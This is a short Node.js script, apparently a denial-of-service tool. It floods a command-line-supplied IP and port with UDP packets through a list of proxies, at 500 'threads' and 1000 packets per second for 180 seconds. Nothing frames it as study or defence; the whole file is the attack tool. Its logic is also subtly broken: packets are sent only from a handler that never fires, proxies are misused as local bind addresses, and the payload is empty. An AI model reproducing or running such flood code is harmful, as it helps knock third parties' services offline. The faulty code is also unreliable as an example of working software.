const dgram = require('dgram');
const fs = require('fs');

// Read proxies from file
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n');

// Get IP and port from command line arguments
const ip = process.argv[2];
const port = process.argv[3];

// Set number of threads and packets per second
const threads = 500;
const packetsPerSecond = 1000;

// Set timeout for the script
const timeout = 180;

// Create a UDP socket
const socket = dgram.createSocket('udp4');

// Function to send packets
function sendPackets() {
  const proxy = proxies[Math.floor(Math.random() * proxies.length)];
  const [proxyIP, proxyPort] = proxy.split(':');

  const client = dgram.createSocket('udp4');

  client.on('message', () => {
    // Send a UDP packet
    const message = Buffer.from('');
    socket.send(message, 0, message.length, port, ip, (err) => {
      if (err) {
        console.error(`Error: ${err.message}`);
      }
    });
  });

  client.bind(0, proxyIP);
}

// Send packets continuously with a delay between each packet
const interval = setInterval(() => {
  for (let i = 0; i < threads; i++) {
    sendPackets();
  }
}, 1000 / packetsPerSecond);

// Stop sending packets after timeout
setTimeout(() => {
  clearInterval(interval);
  socket.close();
  console.log('UDP flooding stopped');
  process.exit();
}, timeout * 1000);